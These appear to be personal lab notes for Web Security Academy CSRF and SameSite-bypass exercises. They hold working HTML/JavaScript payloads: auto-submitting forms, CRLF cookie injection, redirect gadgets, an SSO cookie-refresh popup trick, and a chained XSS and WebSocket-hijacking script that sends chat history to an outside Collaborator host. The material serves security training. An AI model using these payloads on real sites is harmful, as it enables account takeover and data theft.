- - - 
This is the easiest example
```html
<html>
	<body>
		<form method="POST" id="csrfForm" action="https://vulnerable.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="0xPelamar@proton.me" />
		</form>
		<script>
			document.getElementById('csrfForm').submit();
		</script>
	</body>
</html>
```
- - - 
In this attack, we first set a cookie in the victim browser and do a CSRF Attack
This case is about "**CSRF token is not tied to the user session**"
```html
<html>
<body>
	<img src="https://lab.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=token%3b%20SameSite=None" onerror="document.forms[0].submit()">
		<form method="POST" id="csrfForm" action="https://lab.web-security-academy.net/my-account/change-email">
		<input type="hidden" name="email" value="0xPelamar@what.ever" />
		<input type="hidden" name="csrf" value="Lj9831HxzIH7Dwx8a3Izv6kPdlydfuhM" />
		<input type="submit" value="Submit request">
		</form>
</body>
</html>
```
- - -
**Finding a gadget that redirects the user to bypass Strict cookie**
1. Find gadget URL e.g. `/post/comment/confirmation?postId=x`.
2. Modify param: `postId=1/../../my-account` → If it navigates to `/my-account`, gadget can request arbitrary internal paths.
3. Convert `POST /.../change-email` → GET and send. If GET works, endpoint is GET-callable.   
```html
   <script> 
   document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=0xPelamar%40what.ever%26submit=1"; 
   </script>
   ```
   Strict bypassed because the second request issued by the same origin
   - - - 

**Bypassing SameSite Lax restrictions with newly issued cookies**
Cookies with `Lax` SameSite restrictions aren't normally sent in any cross-site `POST` requests, but there are some exceptions. As mentioned earlier, if a website doesn't include a `SameSite` attribute when setting a cookie, Chrome automatically applies `Lax` restrictions by default. However, to avoid breaking single sign-on (SSO) mechanisms, it doesn't actually enforce these restrictions for the first 120 seconds on top-level `POST` requests. As a result, there is a two-minute window in which users may be susceptible to cross-site attacks. It's somewhat impractical to try timing the attack to fall within this short window. On the other hand, if you can find a gadget on the site that enables you to force the victim to be issued a new session cookie, you can preemptively refresh their cookie before following up with the main attack. For example, completing an OAuth-based login flow may result in a new session each time as the OAuth service doesn't necessarily know whether the user is still logged in to the target site. To trigger the cookie refresh without the victim having to manually log in again, you need to use a top-level navigation, which ensures that the cookies associated with their current OAuth session are included. This poses an additional challenge because you then need to redirect the user back to your site so that you can launch the CSRF attack. Alternatively, you can trigger the cookie refresh from a new tab so the browser doesn't leave the page before you're able to deliver the final attack. A minor snag with this approach is that browsers block popup tabs unless they're opened via a manual interaction. For example, the following popup will be blocked by the browser by default:
```javascript
window.open('https://vulnerable-website.com/login/sso');
```
To get around this, you can wrap the statement in an `onclick` event handler as follows:
```javascript
window.onclick = () => { 
	window.open('https://vulnerable-website.com/login/sso'); 
}
```
This way, the `window.open()` method is only invoked when the user clicks somewhere on the page.
**SSO cookie-refresh attack flow**
- **Find gadget**: identify endpoint/flow that issues a new session cookie (e.g., OAuth login, `/login/sso`).
- **Trigger top-level navigation**: force the victim to navigate to that endpoint (redirect or open a new tab) so the server sets a fresh session cookie.
- **Ensure cookie is set**: navigation must be top-level (iframe/XHR unreliable); new cookie becomes subject to SameSite Lax exception (≈120s).
- **Return/control payload page**: have the victim land (or keep) on a page you control so you can run the CSRF payload.
- **Execute CSRF**: send the state-changing request (POST/fetch/form submit) while the fresh cookie is present.
- **Optional: popup approach** open a new tab/window via a user gesture (onclick) to avoid leaving the main page; popup blockers require a real user interaction.
```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="0xPelamar@what.ever">
</form>
<p>Click anywhere on the page</p>
<script>
window.onclick = () => {
window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
setTimeout(changeEmail, 5000);
}
function changeEmail() {
document.forms[0].submit();
}
</script>
```
- - - 
Lab Description: Chained XSS and CSWSH to Bypass SameSite Restrictions

Study the live chat feature
1. In Burp's browser, go to the live chat feature and send a few messages.
2. In Burp, go to the **Proxy > HTTP history** tab and find the WebSocket handshake request. This should be the most recent `GET /chat` request.
3. Notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSWSH if you can bypass any SameSite cookie restrictions.
4. In the browser, refresh the live chat page.
5. In Burp, go to the **Proxy > WebSockets history** tab. Notice that when you refresh the page, the browser sends a `READY` message to the server. This causes the server to respond with the entire chat history.
**Confirm the CSWSH vulnerability**
```html
    <script> 
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() { 
    ws.send("READY"); 
    }; 
    ws.onmessage = function(event) { 
    fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data
    }); 
    }; 
    </script>
```

6. Notice that although you've confirmed the CSWSH vulnerability, you've only exfiltrated the chat history for a brand new session, which isn't particularly useful.
7. Go to the **Proxy > HTTP history** tab and find the WebSocket handshake request that was triggered by your script. This should be the most recent `GET /chat` request.
8. Notice that your session cookie was not sent with the request.
9. In the response, notice that the website explicitly specifies `SameSite=Strict` when setting session cookies. This prevents the browser from including these cookies in cross-site requests.
**Identify an additional vulnerability in the same "site"**
10. In Burp, study the proxy history and notice that responses to requests for resources like script and image files contain an `Access-Control-Allow-Origin` header, which reveals a sibling domain at `cms-YOUR-LAB-ID.web-security-academy.net`.
11. In the browser, visit this new URL to discover an additional login form.
12. Submit some arbitrary login credentials and observe that the username is reflected in the response in the `Invalid username` message.
13. Try injecting an XSS payload via the `username` parameter, for example:
    `<script>alert(1)</script>`
14. Observe that the `alert(1)` is called, confirming that this is a viable reflected XSS vector.
15. Send the `POST /login` request containing the XSS payload to Burp Repeater.
16. In Burp Repeater, right-click on the request and select **Change request method** to convert the method to `GET`. Confirm that it still receives the same response.
17. Right-click on the request again and select **Copy URL**. Visit this URL in the browser and confirm that you can still trigger the XSS. As this sibling domain is part of the same site, you can use this XSS to launch the CSWSH attack without it being mitigated by SameSite restrictions
**Bypass the SameSite restrictions**
18. Recreate the CSWSH script that you tested on the exploit server earlier.
```html
<script> 
var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat'); ws.onopen = function() { ws.send("READY"); }; 
ws.onmessage = function(event) { fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data}); }; </script>
```
19. URL encode the entire script.
20. Go back to the exploit server and create a script that induces the viewer's browser to send the `GET` request you just tested, but use the URL-encoded CSWSH payload as the `username` parameter. The following is one possible approach:
```html
<script> 
document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything"; 
</script>
```
19. Store and view the exploit yourself.
20. In Burp, go back to the **Collaborator** tab and click **Poll now**. Observe that you've received a number of new interactions, which contain your entire chat history.
21. Go to the **Proxy > HTTP history** tab and find the WebSocket handshake request that was triggered by your script. This should be the most recent `GET /chat` request.
22. Confirm that this request does contain your session cookie. As it was initiated from the vulnerable sibling domain, the browser considers this a same-site request.
---

